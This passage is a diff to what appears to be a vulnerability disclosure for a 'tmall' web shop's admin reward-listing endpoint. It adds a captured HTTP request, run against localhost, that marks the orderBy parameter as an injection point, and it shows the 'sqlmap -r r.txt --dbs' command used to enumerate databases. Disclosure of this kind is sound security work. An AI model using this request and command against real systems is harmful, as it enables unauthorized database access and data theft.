@@ -26,6 +26,24 @@ r.txt
 sqlmap test results
 
 ```sqlmap -r r.txt --dbs```
+```
+GET /tmall/admin/reward/0/10?reward_name=1&reward_lowest_amount=&reward_highest_amount=&reward_isEnabled_array=0&reward_isEnabled_array=1&reward_isEnabled_array=2&orderBy=*&isDesc=true HTTP/1.1
+Host: 127.0.0.1:8887
+sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
+Accept: */*
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:8887/tmall/admin
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: username=admin; JSESSIONID=42BD58B31D8447153DA8D396860E0888
+Connection: close
+```
 
 <img width="1343" height="824" alt="image" src="https://github.com/user-attachments/assets/671cad69-64f6-4f5f-b357-9eff6550bee6" />
 
